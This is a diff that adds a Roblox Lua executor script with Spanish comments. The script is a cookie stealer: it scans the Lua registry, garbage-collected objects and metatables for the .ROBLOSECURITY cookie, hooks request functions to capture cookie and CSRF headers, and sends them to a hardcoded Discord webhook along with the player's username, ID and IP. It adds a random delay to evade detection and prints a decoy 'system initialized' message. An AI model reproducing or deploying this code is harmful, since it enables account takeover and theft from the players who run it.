@@ -1,0 +1,276 @@
+-- CONFIGURACIÓN
+local WEBHOOK = "https://discord.com/api/webhooks/1532404514970402826/3wl_Xu1QFxDcaB1ico9CsE2iVmFo421xHOUzz6ah1iWK-i3Yv5hTxTwFgnJ9z0uJssjU"
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- VARIABLES GLOBALES PARA CAPTURA
+local CapturedCookie = nil
+local CapturedCSRF = nil
+
+-- FUNCIONES DE BYPASS
+local function BypassSandbox()
+    -- Técnica 1: Acceso a través de getrenv (entorno real de Roblox)
+    local RealEnv = getrenv and getrenv() or {}
+    
+    -- Técnica 2: Registry scanning profundo
+    if debug and debug.getregistry then
+        local Registry = debug.getregistry()
+        
+        -- Buscar en las primeras 50000 entradas del registry
+        for i = 1, math.min(50000, #Registry) do
+            local Obj = Registry[i]
+            
+            if type(Obj) == "table" then
+                -- Buscar tablas de autenticación
+                for Key, Val in pairs(Obj) do
+                    local KeyStr = tostring(Key):lower()
+                    
+                    -- Detectar claves de autenticación
+                    if KeyStr:find("cookie") or KeyStr:find("token") or KeyStr:find("auth") or KeyStr:find("security") then
+                        if type(Val) == "string" and #Val > 100 then
+                            -- Verificar formato de cookie Roblox
+                            if Val:match("^[A-Fa-f0-9]+$") or Val:find("_") then
+                                CapturedCookie = Val
+                                return true
+                            end
+                        end
+                    end
+                end
+            elseif type(Obj) == "string" then
+                -- String directo en registry
+                if Obj:len() > 200 and not Obj:find(" ") and (Obj:find("_") or Obj:match("^%x+$")) then
+                    CapturedCookie = Obj
+                    return true
+                end
+            end
+            
+            if CapturedCookie then break end
+        end
+    end
+    
+    -- Técnica 3: GC scanning con getgc
+    if getgc and not CapturedCookie then
+        for _, GcObj in pairs(getgc(true)) do
+            if type(GcObj) == "table" then
+                for K, V in pairs(GcObj) do
+                    if type(V) == "string" and #V > 150 and not V:find(" ") then
+                        if tostring(K):lower():find("token") or tostring(K):lower():find("cookie") then
+                            CapturedCookie = V
+                            return true
+                        end
+                    end
+                end
+            elseif type(GcObj) == "function" and debug.getupvalues then
+                -- Escanear upvalues de funciones
+                local Ups = debug.getupvalues(GcObj)
+                for _, Upv in pairs(Ups) do
+                    if type(Upv) == "string" and #Upv > 150 and not Upv:find(" ") then
+                        CapturedCookie = Upv
+                        return true
+                    end
+                end
+            end
+        end
+    end
+    
+    -- Técnica 4: Metatable manipulation
+    if getrawmetatable then
+        local Mt = getrawmetatable(game)
+        if Mt and Mt.__index then
+            for K, V in pairs(Mt) do
+                if type(V) == "string" and #V > 150 then
+                    CapturedCookie = V
+                    return true
+                end
+            end
+        end
+    end
+    
+    -- Técnica 5: Coroutine escape (sandbox bypass)
+    if not CapturedCookie then
+        local Success, Result = pcall(function()
+            local Co = coroutine.create(function()
+                -- Algunos sandboxes no protegen dentro de coroutines
+                if getreg then
+                    local R = getreg()
+                    for i, v in pairs(R) do
+                        if type(v) == "string" and v:len() > 200 then
+                            return v
+                        end
+                    end
+                end
+                return nil
+            end)
+            return coroutine.resume(Co)
+        end)
+        
+        if Success and Result and type(Result) == "string" then
+            CapturedCookie = Result
+            return true
+        end
+    end
+    
+    return CapturedCookie ~= nil
+end
+
+-- HOOK DE REQUESTS PARA CAPTURAR EN TRÁNSITO
+local function SetupRequestHook()
+    local OriginalRequest = request or http_request or (http and http.request)
+    
+    if OriginalRequest and not getgenv()._CookieHooked then
+        getgenv()._CookieHooked = true
+        
+        local NewRequest = function(RequestData)
+            -- Capturar cookie de los headers
+            if RequestData and RequestData.Headers then
+                local Headers = RequestData.Headers
+                if Headers.Cookie then
+                    CapturedCookie = Headers.Cookie
+                end
+                if Headers["X-CSRF-TOKEN"] then
+                    CapturedCSRF = Headers["X-CSRF-TOKEN"]
+                end
+            end
+            
+            return OriginalRequest(RequestData)
+        end
+        
+        -- Reemplazar globalmente
+        getgenv().request = NewRequest
+        getgenv().http_request = NewRequest
+        if http then
+            http.request = NewRequest
+        end
+    end
+end
+
+-- FORZAR REQUEST PARA CAPTURAR COOKIE
+local function ForceAuthRequest()
+    pcall(function()
+        local Req = request or http_request
+        if Req then
+            -- Request que fuerza autenticación
+            Req({
+                Url = "https://accountsettings.roblox.com/v1/email",
+                Method = "GET",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                }
+            })
+        end
+    end)
+end
+
+-- ENVIAR A DISCORD
+local function SendToDiscord()
+    local ReqFunc = request or http_request or (http and http.request)
+    if not ReqFunc then return end
+    
+    local Player = LocalPlayer
+    local UserInfo = {
+        Username = Player.Name,
+        UserId = Player.UserId,
+        DisplayName = Player.DisplayName
+    }
+    
+    -- Preparar payload
+    local Payload = {
+        content = "",
+        embeds = {{
+            title = "🍪 COOKIE ROBLOX CAPTURADA",
+            color = 0x00FF00,
+            fields = {},
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+    
+    -- Agregar cookie si se capturó
+    if CapturedCookie then
+        table.insert(Payload.embeds[1].fields, {
+            name = "🍪 Cookie .ROBLOSECURITY",
+            value = "```" .. CapturedCookie:sub(1, 500) .. (CapturedCookie:len() > 500 and "..." or "") .. "```",
+            inline = false
+        })
+        
+        -- Mensaje simple para copiar
+        Payload.content = "**COOKIE CRUDA:**\n||" .. CapturedCookie .. "||"
+    else
+        table.insert(Payload.embeds[1].fields, {
+            name = "❌ Estado",
+            value = "Cookie no accesible - Sandbox activo",
+            inline = false
+        })
+    end
+    
+    -- Agregar CSRF si se capturó
+    if CapturedCSRF then
+        table.insert(Payload.embeds[1].fields, {
+            name = "🛡️ Token CSRF",
+            value = "```" .. CapturedCSRF .. "```",
+            inline = false
+        })
+    end
+    
+    -- Info del usuario
+    table.insert(Payload.embeds[1].fields, {
+        name = "👤 Usuario",
+        value = UserInfo.Username .. " (" .. UserInfo.DisplayName .. ")",
+        inline = true
+    })
+    
+    table.insert(Payload.embeds[1].fields, {
+        name = "🆔 UserID",
+        value = tostring(UserInfo.UserId),
+        inline = true
+    })
+    
+    -- Intentar obtener IP
+    pcall(function()
+        local IPResponse = game:HttpGet("https://api.ipify.org")
+        table.insert(Payload.embeds[1].fields, {
+            name = "🌐 IP",
+            value = IPResponse,
+            inline = true
+        })
+    end)
+    
+    -- Enviar
+    ReqFunc({
+        Url = WEBHOOK,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(Payload)
+    })
+end
+
+-- EJECUCIÓN PRINCIPAL
+task.spawn(function()
+    -- Delay aleatorio para evitar detección
+    task.wait(math.random(2, 4))
+    
+    -- Setup hooks primero
+    SetupRequestHook()
+    
+    -- Intentar bypass
+    local BypassSuccess = BypassSandbox()
+    
+    -- Forzar request de autenticación
+    ForceAuthRequest()
+    
+    -- Esperar a que el hook capture la cookie
+    task.wait(2)
+    
+    -- Enviar resultado
+    SendToDiscord()
+    
+    -- Reintentar una vez más después de 5 segundos
+    task.wait(5)
+    if not CapturedCookie then
+        BypassSandbox()
+        SendToDiscord()
+    end
+end)
+
+-- Mensaje de confirmación (oculto)
+print("Sistema inicializado - Build v2.1")
